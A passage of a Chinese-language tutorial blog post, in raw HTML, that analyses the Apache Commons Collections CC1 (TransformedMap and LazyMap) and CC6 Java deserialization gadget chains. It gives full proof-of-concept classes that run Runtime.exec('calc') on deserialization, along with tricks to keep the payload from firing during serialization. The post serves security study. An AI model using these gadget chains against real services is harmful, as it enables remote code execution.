class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap= TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Target.class,transformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h3><p>下面我们继续分析另一条cc1，也是ysoserial里面的payload。</p><p>它整个的Gadget chain为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>可以发现，其实大部分都和前面一样的，在我们分析第一条的时候，当时在找transform我们发现了有几个map，第一条用的是TransformedMap，我们还可以用其他的Map。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210923296.png" alt="img"></p><p>这里其实DefaultMap和LazyMap都是用的get，来看看LazyMap是如何调用的。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210924521.png" alt="img"></p><p>这里进去的逻辑很简单，直接分析了再往后走，就是判断map是否包含这个key然后调用factory的transform。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210924615.png" alt="img"></p><p>我们看到两个有参构造器，肯定选第二个，有个Transformer，值得注意的是，这里也是protected，但好在前面有decorate方法。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210924211.png" alt="img"></p><p>和前面的TransformedMap差不太多。继续往后走，寻找调用get的方法。这里有太多了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210924268.png" alt="img"></p><p>所以想要寻找是很难的，我们直接分析作者找到的链子吧。</p><p>往后用到的还是AnnotationInvocationHandler类。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210924015.png" alt="img"></p><p>首先我们第一反应肯定还是去看readObject，这样我们就不用再走了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210924237.png" alt="img"></p><p>但是这里的memberTypes我们控制不了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210924449.png" alt="img"></p><p>它是由annotationType.memberTypes()去决定的。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210925380.png" alt="img"></p><p>annotationType也是确定好的，注解类型，我们需要再看看类中的其他调用get的地方，其实和前面一种差不多，在第一条我们用的是memberValue.setValue，这里我们去找memberValue.get。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210925207.png" alt="img"></p><p>我们可以去看Invoke方法。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210925317.png" alt="img"></p><p>我们这个类和动态代理是有关的，而动态代理有个特点，调用代理类的方法，就会去触发代理类的Invoke方法。</p><p>动态代理：被代理类 + 处理器类 + 被代理的接口。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210925585.png" alt="img"></p><p>我们到达memberValues.get()还需要经过几个判断，第一个if只有我们调用的方法名字不为equals即可绕过，第二个我们调用无参方法即可绕过，后面的switch我们只要不为那几个方法就行了。</p><p>也就是说我们只需要创建一个代理对象，通过反射让其代理处理器为AnnotationInvocationHandler类，然后调用代理对象（proxy的第二个参数）的特定无参方法，即可触发invoke方法。</p><p>我们最后肯定是需要走readObject的，我们直接先看该类中有没有满足条件的，就不需要再去找其他的方法。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210925768.png" alt="img"></p><p>也是刚好用到了memberValues的无参方法。</p><p>然后我们回顾一下前面的，来写poc。</p><p>首先我们保留第一条一直到map.put的地方。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210925333.png" alt="img"></p><p>创建一个LazyMap实例transfromedmap，将链式transformer传进去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object,Object&gt; transformedmap= LazyMap.decorate(map,chainedTransformer);</span><br></pre></td></tr></table></figure><p>接着，我们通过反射等操作拿到AnnotationInvocationHandler的构造器，并将前面的transforedmap传进去进行实例化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, transformedmap);</span><br></pre></td></tr></table></figure><p>此时，实例化出来的invocationHandler的memberValues也就是我们传进去的transformedmap了。</p><p>接着我们创建一个动态代理对象，并实现Map接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);</span><br></pre></td></tr></table></figure><p>之所以是Map对象，是因为我们前面分析了会调用entrySet无参方法。并且做了一个强转。创建的代理对象被强转为Map类型，这里意味着代理对象可以像普通的Map对象一样使用，但实际上它的方法调用会被转发到invocationHandler。</p><p>最后我们再次进行实例化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, proxyMap);</span><br></pre></td></tr></table></figure><p>然后就是反序列化了，这里的实例化出的对象是我们最终需要的，它在被反序列化的时候，proxyMap成为了memberValues，然后会去触发memberValues的entrySet，也就是前面所说的可以像普通的Map对象一样使用，但是方法调用会被转发到invocationHandler，也就是说调用到了对应的无参方法，去触发invocationHandler里面的invoke方法，然后触发get方法，再到LazyMap的transform后面就是差不多的链式调用了。</p><h4 id="Poc-2"><a href="#Poc-2" class="headerlink" title="Poc"></a>Poc</h4><p>完整的poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1_2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">rc</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap= LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, proxyMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC6链"><a href="#CC6链" class="headerlink" title="CC6链"></a>CC6链</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>环境还是之前cc1的环境，jdk8u65，cc3.2.1。</p><p>在前面的cc1，我们对cc的版本与jdk的版本都有依赖，所以其实不算一个比较好用的链子。这次来分析的cc6，对jdk的版本没有限制（主要原因是基本上用的是cc里面的东西）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">          java.util.HashSet.readObject()</span><br><span class="line">              java.util.HashMap.put()</span><br><span class="line">              java.util.HashMap.hash()</span><br><span class="line">                  org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                  org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                      org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                          org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                          org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                          java.lang.reflect.Method.invoke()</span><br><span class="line">                              java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><p>可以发现后半部分还是和前面的cc1一样的，并且前半部分用到的是URLDNS链里面的部分，主要是融入了一个TiedMapEntry。</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们直接接着cc1的LazyMap里面的get继续分析，在前面我们寻找到的get是在AnnotationInvocationHandler里面，这次我们是去看一个叫TiedMapEntry的类。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210933923.png" alt="img"></p><p>跟进去。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210933545.png" alt="img"></p><p>发现就短短的一行，并且这个map我们是可控的。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210933453.png" alt="img"></p><p>继续寻找getValue的方法。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210933110.png" alt="img"></p><p>TiedMapEntry里面也有这个，我们继续利用该类，并且这是我们熟悉的hashCode。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210933413.png" alt="img"></p><p>后面就是URLDNS的链子了，回顾一下。</p><p>当时的URLDNS的链子如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. HashMap.readObject()</span><br><span class="line">2. HashMap.putVal()</span><br><span class="line">3. HashMap.hash()</span><br><span class="line">4. URL.hashCode()</span><br></pre></td></tr></table></figure><p>cc6这里就是把URL.hashCode换成了TiedMapEntry的hashCode。</p><p>直接来写poc。</p><p>cc1的后段部分，我们继续沿用就好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">rc</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedmap= LazyMap.decorate(map,chainedTransformer);</span><br></pre></td></tr></table></figure><p>由于TiedMapEntry的构造器是public，我们直接实例化就行了，并传入我们前面生成的transformedmap。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(transformedmap,<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后我们创建HashMap，把tiedMapEntry传进去就好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>得到了大致的poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">rc</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap= LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(transformedmap,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里之后就会出现和我们之前在URLDNS链中遇到的问题了，我们在序列化的时候就会弹计算器了。</p><p>主要问题还是出现在put的地方，经过调试发现在put的时候我们就已经触发了TiedMapEntry里面的hashCode方法中的getValue，然后就执行了弹计算器命令，我们只要在put之前去掉命令的执行，然后put之后再修改回来就好了。</p><p>这里修改的方法有很多了，只要保证没有命令执行就行了。</p><p>我这里将LazyMap实例化的地方进行修改，将chainedTransformer，放在后续传入。</p><p>然后我们要看看，后续我们修改的是什么变量，去LazyMap实例化的方法看。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210934670.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210934249.png" alt="img"></p><p>也就是说，我们后面需要修改实例化出来的transformedmap，将它的成员变量factory修改为chainedTransformer。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">lazyMapClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">factoryField.set(transformedmap,chainedTransformer);</span><br></pre></td></tr></table></figure><p>但是发现这样反序列化和序列化都弹不了计算器了，那是因为LazyMap里面有一个判断。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210934973.png" alt="img"></p><p>我们前面虽然避免了它去执行命令，但是map的key是已经被传入了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210934142.png" alt="img"></p><p>进行调试可以发现，在反序列化的时候，我们传入了a，并且此时我们实例化出的transformedmap没有这个key，这里进行了一个put的操作，将key存了进去。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210934602.png" alt="img"></p><p>然后导致反序列化的时候直接跳转到了map.get()，而走不到里面的factory.transform()，也就导致最后不能弹计算器。</p><p>在反序列化前删掉这个a就好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transformedmap.remove(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Poc-3"><a href="#Poc-3" class="headerlink" title="Poc"></a>Poc</h3><p>完整的poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 